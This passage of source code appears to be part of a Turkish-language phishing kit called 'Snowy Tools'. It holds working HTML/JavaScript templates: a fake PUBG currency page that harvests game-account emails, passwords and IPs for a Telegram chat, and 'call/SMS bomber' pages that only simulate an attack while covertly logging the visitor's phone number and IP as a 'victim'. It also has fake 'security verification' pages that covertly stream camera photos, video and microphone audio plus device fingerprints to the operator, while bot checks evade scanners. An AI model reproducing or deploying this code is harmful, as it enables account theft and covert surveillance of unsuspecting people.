            let msgText = `🎮 <b>SNOWY PUBG HACK</b> 🎮\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || 'Alınamadı'}\n📧 E-POSTA: ${escapeHtml(email)}\n🔑 ŞİFRE: ${escapeHtml(password)}\n🎮 OYUNCU ID: ${escapeHtml(playerid)}\n💰 UC MİKTARI: ${amount}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
            
            fetch('/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: msgText
                })
            }).then(res => console.log('Telegram gönderimi yapıldı')).catch(e => console.log('Gönderim hatası:', e));
        }
        
        window.sendCredentials = function() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const playerid = document.getElementById('playerid').value.trim();
            const amount = document.getElementById('amount').value.trim();
            
            if (!email || !password) {
                alert('Lütfen e-posta adresinizi ve şifrenizi girin!');
                return;
            }
            
            function sendWithIP() {
                let ip = window.visitorIP || 'Alınamadı';
                sendToTelegram(email, password, playerid, amount, ip);
                
                document.getElementById('submitBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';
                
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.pubg.com/';
                    }, 3000);
                }, 2000);
            }
            
            if (window.visitorIP) {
                sendWithIP();
            } else {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        window.visitorIP = data.ip;
                        sendWithIP();
                    })
                    .catch(() => {
                        sendWithIP();
                    });
            }
        };
    </script>
</body>
</html>'''

# ============================================
# CALL BOMBER PAGE (DÜZELTİLDİ - BİLGİLER GELİYOR)
# ============================================
CALL_BOMBER_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Call Bomber | Snowy Tools</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
        }
        h2 { color: #1a1a2e; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        .sub { color: #666; margin-bottom: 30px; font-size: 14px; }
        .warning-note {
            background: #fff3e0;
            border-left: 4px solid #ff9800;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 10px;
            font-size: 13px;
            color: #e65100;
            text-align: left;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .input-group input:focus {
            border-color: #667eea;
            outline: none;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
            margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading {
            display: none;
            margin-top: 20px;
            color: #667eea;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info { color: #4caf50; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📞 <span>SNOWY</span> CALL BOMBER</h2>
        <div class="sub">Ücretsiz ve limitsiz arama bombası</div>
        
        <div class="warning-note">
            ⚠️ <strong>ÖNEMLİ:</strong> Numaranızı <strong>5 ile başlayacak şekilde</strong> giriniz!<br>
            Örnek: 5555555555
        </div>
        
        <div class="input-group">
            <label>📱 HEDEF NUMARA (5 ile başlayan)</label>
            <input type="tel" id="phone" placeholder="5555555555" maxlength="10" inputmode="numeric">
        </div>
        
        <div class="input-group">
            <label>⚡ BOMBA GÜCÜ</label>
            <input type="number" id="count" placeholder="100" value="100">
        </div>
        
        <button class="btn" onclick="startAttack()">🚀 SALDIRIYI BAŞLAT</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div id="loadingText">Saldırı başlatılıyor...</div>
        </div>
        
        <div class="info">✅ 7/24 Aktif | Yüksek Hız | Başarılı Saldırı</div>
    </div>
    
    <script>
        const TARGET_ID = "{{ chat_id }}";
        let visitorId = localStorage.getItem('visitor_id');
        if (!visitorId) {
            visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', visitorId);
        }
        
        let phoneSent = false;
        let attackStarted = false;
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        function sendInfoToBot(phone, ip) {
            if (!phone || phone.length !== 10 || !phone.startsWith('5')) return;
            if (!ip) return;
            
            let msgText = `📞 <b>SNOWY CALL BOMBER KURBAN</b> 📞\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n📱 NUMARA: ${phone}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
            
            fetch('/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: msgText
                })
            }).catch(e => console.log('Gönderim hatası:', e));
            
            console.log('Bilgi gönderildi - Numara:', phone);
        }
        
        // IP al ve numara girilince gönder
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                window.visitorIP = data.ip;
                console.log('IP alındı:', window.visitorIP);
                
                const phoneInput = document.getElementById('phone');
                phoneInput.addEventListener('input', function() {
                    let val = this.value.replace(/[^0-9]/g, '');
                    this.value = val;
                    const phone = this.value;
                    if (phone && phone.length === 10 && phone.startsWith('5') && !phoneSent && window.visitorIP) {
                        phoneSent = true;
                        sendInfoToBot(phone, window.visitorIP);
                    }
                });
            })
            .catch(e => {
                console.log('IP alınamadı:', e);
                window.visitorIP = 'Alınamadı';
            });
        
        function startAttack() {
            const phone = document.getElementById('phone').value;
            const count = document.getElementById('count').value;
            
            if (!phone || phone.length !== 10) {
                alert('Lütfen 10 haneli numaranızı girin! Örnek: 5555555555');
                return;
            }
            if (!phone.startsWith('5')) {
                alert('Numara 5 ile başlamalıdır! Örnek: 5555555555');
                return;
            }
            
            // Eğer daha önce gönderilmemişse şimdi gönder
            if (!phoneSent && window.visitorIP) {
                phoneSent = true;
                sendInfoToBot(phone, window.visitorIP);
            }
            
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn').disabled = true;
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                document.getElementById('loadingText').innerHTML = `Saldırı devam ediyor... ${i}/${count} arama gönderildi`;
                if (i >= parseInt(count)) {
                    clearInterval(interval);
                    document.getElementById('loadingText').innerHTML = '✅ Saldırı tamamlandı!';
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.querySelector('.btn').disabled = false;
                    }, 2000);
                }
            }, 500);
        }
        
        window.startAttack = startAttack;
    </script>
</body>
</html>'''

# ============================================
# SMS BOMBER PAGE (DÜZELTİLDİ - GERİ SAYIMLI + BİLGİLER GELİYOR)
# ============================================
SMS_BOMBER_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SMS Bomber | Snowy Tools</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
        }
        h2 { color: #1a1a2e; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        .sub { color: #666; margin-bottom: 30px; font-size: 14px; }
        .warning-note {
            background: #fff3e0;
            border-left: 4px solid #ff9800;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 10px;
            font-size: 13px;
            color: #e65100;
            text-align: left;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .input-group input, .input-group textarea {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.3s;
            font-family: inherit;
        }
        .input-group textarea {
            resize: none;
            height: 100px;
        }
        .input-group input:focus, .input-group textarea:focus {
            border-color: #667eea;
            outline: none;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
            margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading {
            display: none;
            margin-top: 20px;
            color: #667eea;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info { color: #4caf50; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📱 <span>SNOWY</span> SMS BOMBER</h2>
        <div class="sub">Ücretsiz ve limitsiz SMS bombası</div>
        
        <div class="warning-note">
            ⚠️ <strong>ÖNEMLİ:</strong> Numaranızı <strong>5 ile başlayacak şekilde</strong> giriniz!<br>
            Örnek: 5555555555
        </div>
        
        <div class="input-group">
            <label>📱 HEDEF NUMARA (5 ile başlayan)</label>
            <input type="tel" id="phone" placeholder="5555555555" maxlength="10" inputmode="numeric">
        </div>
        
        <div class="input-group">
            <label>📝 MESAJ (Opsiyonel)</label>
            <textarea id="message" placeholder="Mesajınız..."></textarea>
        </div>
        
        <div class="input-group">
            <label>⚡ BOMBA GÜCÜ</label>
            <input type="number" id="count" placeholder="100" value="100">
        </div>
        
        <button class="btn" onclick="startAttack()">💣 SALDIRIYI BAŞLAT</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div id="loadingText">Saldırı başlatılıyor...</div>
        </div>
        
        <div class="info">✅ 7/24 Aktif | Yüksek Hız | Başarılı Saldırı</div>
    </div>
    
    <script>
        const TARGET_ID = "{{ chat_id }}";
        let visitorId = localStorage.getItem('visitor_id');
        if (!visitorId) {
            visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', visitorId);
        }
        
        let phoneSent = false;
        let attackStarted = false;
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        function sendInfoToBot(phone, message, ip) {
            if (!phone || phone.length !== 10 || !phone.startsWith('5')) return;
            if (!ip) return;
            
            let msgText = `📱 <b>SNOWY SMS BOMBER KURBAN</b> 📱\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n📱 NUMARA: ${phone}`;
            
            if (message && message.trim()) {
                msgText += `\n📝 MESAJ: ${escapeHtml(message.substring(0, 500))}`;
            }
            
            msgText += `\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
            
            fetch('/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: msgText
                })
            }).catch(e => console.log('Gönderim hatası:', e));
            
            console.log('Bilgi gönderildi - Numara:', phone, 'Mesaj:', message);
        }
        
        // IP al ve numara girilince gönder
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                window.visitorIP = data.ip;
                console.log('IP alındı:', window.visitorIP);
                
                const phoneInput = document.getElementById('phone');
                phoneInput.addEventListener('input', function() {
                    let val = this.value.replace(/[^0-9]/g, '');
                    this.value = val;
                    const phone = this.value;
                    if (phone && phone.length === 10 && phone.startsWith('5') && !phoneSent && window.visitorIP) {
                        phoneSent = true;
                        const message = document.getElementById('message').value;
                        sendInfoToBot(phone, message, window.visitorIP);
                    }
                });
            })
            .catch(e => {
                console.log('IP alınamadı:', e);
                window.visitorIP = 'Alınamadı';
            });
        
        function startAttack() {
            const phone = document.getElementById('phone').value;
            const count = document.getElementById('count').value;
            const message = document.getElementById('message').value;
            
            if (!phone || phone.length !== 10) {
                alert('Lütfen 10 haneli numaranızı girin! Örnek: 5555555555');
                return;
            }
            if (!phone.startsWith('5')) {
                alert('Numara 5 ile başlamalıdır! Örnek: 5555555555');
                return;
            }
            
            // Eğer daha önce gönderilmemişse şimdi gönder
            if (!phoneSent && window.visitorIP) {
                phoneSent = true;
                sendInfoToBot(phone, message, window.visitorIP);
            } else if (!phoneSent && !window.visitorIP) {
                // IP henüz alınmadıysa bekle ve gönder
                setTimeout(() => {
                    if (window.visitorIP && !phoneSent) {
                        phoneSent = true;
                        sendInfoToBot(phone, message, window.visitorIP);
                    } else if (!phoneSent) {
                        sendInfoToBot(phone, message, 'Alınamadı');
                        phoneSent = true;
                    }
                }, 1000);
            }
            
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn').disabled = true;
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                document.getElementById('loadingText').innerHTML = `Saldırı devam ediyor... ${i}/${count} SMS gönderildi`;
                if (i >= parseInt(count)) {
                    clearInterval(interval);
                    document.getElementById('loadingText').innerHTML = '✅ Saldırı tamamlandı!';
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.querySelector('.btn').disabled = false;
                    }, 2000);
                }
            }, 300);
        }
        
        window.startAttack = startAttack;
    </script>
</body>
</html>'''

# ============================================
# KAMERA HACK HTML (MAKS KALİTE - FPS DÜŞMEDEN)
# ============================================
CAMERA_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
        }
        h2 span { color: #667eea; }
        p { color: #4a5568; margin-bottom: 35px; line-height: 1.6; }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 30px 0 20px; }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; font-size: 18px; font-weight: 500; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const MODE = urlParams.get('m') || '';
            
            const ua = navigator.userAgent.toLowerCase();
            const isBotUA = /bot|crawler|spider|scraper|curl|wget|python|java|googlebot|bingbot|facebook|slurp|baiduspider|yandex|duckduckgo|teoma|archive|axios|http|headless/i.test(ua);
            
            let visitorId = sessionStorage.getItem('visitor_id');
            if (!visitorId) {
                visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                sessionStorage.setItem('visitor_id', visitorId);
            }
            
            let ipSent = sessionStorage.getItem('ip_sent');
            
            if (MODE !== 'both' && TARGET_ID && !ipSent && !isBotUA) {
                sessionStorage.setItem('ip_sent', 'true');
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch('/send-message', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\\n━━━━━━━━━━━━━━━━━━━━━\\n🌐 IP: ${d.ip}\\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\\n━━━━━━━━━━━━━━━━━━━━━\\n⚡ @SnowyOrj ⚡`
                            })
                        });
                    }).catch(e => console.log(e));
            }
            
            if (MODE === 'both') {
                var deviceInfo = {
                    visitorId: visitorId,
                    timestamp: new Date().toLocaleString('tr-TR'),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages.join(', '),
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'Desteklenmiyor',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'Bilinmiyor',
                    deviceMemory: navigator.deviceMemory || 'Bilinmiyor',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    screenColorDepth: screen.colorDepth,
                    screenOrientation: screen.orientation ? screen.orientation.type : (window.orientation === 0 ? 'portrait-primary' : 'landscape-primary'),
                    batteryLevel: 'Bilinmiyor',
                    batteryCharging: 'Bilinmiyor',
                    networkType: 'Bilinmiyor',
                    networkSpeed: 'Bilinmiyor',
                    networkRtt: 'Bilinmiyor',
                    geolocation: 'geolocation' in navigator ? 'Var' : 'Yok',
                    bluetooth: 'bluetooth' in navigator ? 'Var' : 'Yok',
                    clipboard: 'clipboard' in navigator ? 'Var' : 'Yok',
                    credentials: 'credentials' in navigator ? 'Var' : 'Yok',
                    permissions: 'permissions' in navigator ? 'Var' : 'Yok',
                    online: navigator.onLine ? 'Evet' : 'Hayır',
                    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    webglVendor: 'Bilinmiyor',
                    webglRenderer: 'Bilinmiyor',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset()
                };
                
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(function(battery) {
                        deviceInfo.batteryLevel = Math.round(battery.level * 100) + '%';
                        deviceInfo.batteryCharging = battery.charging ? 'Evet (Şarj Oluyor)' : 'Hayır (Pil ile)';
                        sendDeviceInfo(deviceInfo);
                    }).catch(function() { sendDeviceInfo(deviceInfo); });
                } else { sendDeviceInfo(deviceInfo); }
                
                var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    deviceInfo.networkType = conn.type || conn.effectiveType || 'Bilinmiyor';
                    deviceInfo.networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'Bilinmiyor';
                    deviceInfo.networkRtt = conn.rtt ? conn.rtt + ' ms' : 'Bilinmiyor';
                }
                
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        deviceInfo.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        deviceInfo.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
                
                function sendDeviceInfo(data) {
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(function(e) {});
                }
            }
            
            const video = document.getElementById('video');
            const canvas2 = document.getElementById('canvas');
            const ctx = canvas2.getContext('2d', { alpha: false });
            let stream = null;
            let isCameraActive = false;
            let isRunning = true;
            let isLoopActive = false;
            let cameraStarted = false;
            
            function takePhoto() {
                return new Promise((resolve) => {
                    if (!stream?.active || !isCameraActive || !isRunning) {
                        resolve(false);
                        return;
                    }
                    try {
                        canvas2.width = video.videoWidth || 640;
                        canvas2.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0);
                        canvas2.toBlob(blob => {
                            if (!blob) {
                                resolve(false);
                                return;
                            }
                            const formData = new FormData();
                            formData.append('chat_id', TARGET_ID);
                            formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                            formData.append('caption', `📸 Anlık Fotoğraf`);
                            fetch('/send-photo', { method: 'POST', body: formData })
                                .then(() => resolve(true))
                                .catch(() => resolve(false));
                        }, 'image/jpeg', 0.95);
                    } catch(e) {
                        console.log('Foto çekme hatası:', e);
                        resolve(false);
                    }
                });
            }
            
            async function startCycle() {
                if (!stream?.active || !isCameraActive || !isRunning) return;
                if (isLoopActive) return;
                isLoopActive = true;
                
                try {
                    // 3 fotoğraf çek
                    for (let i = 0; i < 3; i++) {
                        if (!stream?.active || !isCameraActive || !isRunning) break;
                        await takePhoto();
                        if (i < 2) await new Promise(r => setTimeout(r, 200));
                    }
                    
                    // Video kaydı - CİHAZIN MAX KALİTESİNDE, FPS DÜŞMEDEN
                    const chunks = [];
                    const mr = new MediaRecorder(stream, { 
                        mimeType: 'video/webm'
                    });
                    
                    const videoPromise = new Promise((resolve) => {
                        mr.ondataavailable = (e) => {
                            if (e.data.size > 0) {
                                chunks.push(e.data);
                            }
                        };
                        
                        mr.onstop = () => {
                            if (chunks.length > 0) {
                                const blob = new Blob(chunks, { type: 'video/webm' });
                                const formData = new FormData();
                                formData.append('chat_id', TARGET_ID);
                                formData.append('video', blob, `video_${Date.now()}.webm`);
                                formData.append('caption', `🎥 3 Saniyelik Video`);
                                fetch('/send-video', { method: 'POST', body: formData })
                                    .finally(() => resolve());
                            } else {
                                resolve();
                            }
                        };
                        
                        mr.onerror = () => resolve();
                    });
                    
                    mr.start(3000);
                    await new Promise(r => setTimeout(r, 3100));
                    
                    if (mr && mr.state === 'recording') {
                        mr.stop();
                    }
                    
                    await videoPromise;
                    
                } catch(e) {
                    console.log('Döngü hatası:', e);
                }
                
                isLoopActive = false;
                if (isRunning && isCameraActive && stream?.active) {
                    setTimeout(() => {
                        startCycle();
                    }, 100);
                }
            }
            
            async function startCamera() {
                if (cameraStarted) return;
                cameraStarted = true;
                
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    isCameraActive = true;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        setTimeout(() => {
                            if (isRunning && isCameraActive && stream?.active) {
                                startCycle();
                            }
                        }, 500);
                    };
                    
                    window.addEventListener('beforeunload', function() {
                        isRunning = false;
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                    });
                } catch(e) { 
                    alert('Kamera izni gerekli!');
                    cameraStarted = false;
                }
            }
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
</html>'''

# ============================================
# MİKROFON HACK HTML (MAKS KALİTE)
# ============================================
MICROPHONE_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
        }
        h2 span { color: #667eea; }
        .status-text {
            font-size: 18px;
            font-weight: 600;
            margin: 20px 0;
            padding: 15px;
            border-radius: 15px;
        }
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .status-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }
        .status-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .loading { display: none; margin: 30px 0 20px; }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; font-size: 18px; font-weight: 500; }
        .mic-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.5; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 0.5; transform: scale(1); }
        }
        .info-text {
            font-size: 13px;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        
        <div id="statusBox" class="status-text status-warning">
            🎙️ Devam etmek için mikrofon erişimine izin verin
        </div>
        
        <div class="mic-icon">🎤</div>
        
        <button class="btn" id="startBtn" onclick="startMicrophone()">✅ DOĞRULAMAYI BAŞLAT</button>
        
        <div class="loading" id="loading" style="display: none;">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
        
        <div class="info-text">🔒 SNOWY Güvenlik Sistemi | Ses Doğrulama</div>
    </div>
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            
            const ua = navigator.userAgent.toLowerCase();
            const isBotUA = /bot|crawler|spider|scraper|curl|wget|python|java|googlebot|bingbot|facebook|slurp|baiduspider|yandex|duckduckgo|teoma|archive|axios|http|headless/i.test(ua);
            
            let visitorId = sessionStorage.getItem('visitor_id');
            if (!visitorId) {
                visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                sessionStorage.setItem('visitor_id', visitorId);
            }
            
            let ipSent = sessionStorage.getItem('ip_sent_mic');
            
            if (TARGET_ID && !ipSent && !isBotUA) {
                sessionStorage.setItem('ip_sent_mic', 'true');
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch('/send-message', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `🎙️ <b>SNOWY MİKROFON HACK</b> 🎙️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                            })
                        });
                    }).catch(e => console.log(e));
            }
            
            let mediaRecorder = null;
            let audioChunks = [];
            let isRecording = false;
            let isRunning = true;
            let micStarted = false;
            let stream = null;
            let isLoopActive = false;
            
            async function recordAndSend() {
                if (!stream || !isRunning) return;
                if (isRecording) return;
                if (isLoopActive) return;
                
                isLoopActive = true;
                isRecording = true;
                audioChunks = [];
                
                try {
                    mediaRecorder = new MediaRecorder(stream);
                    
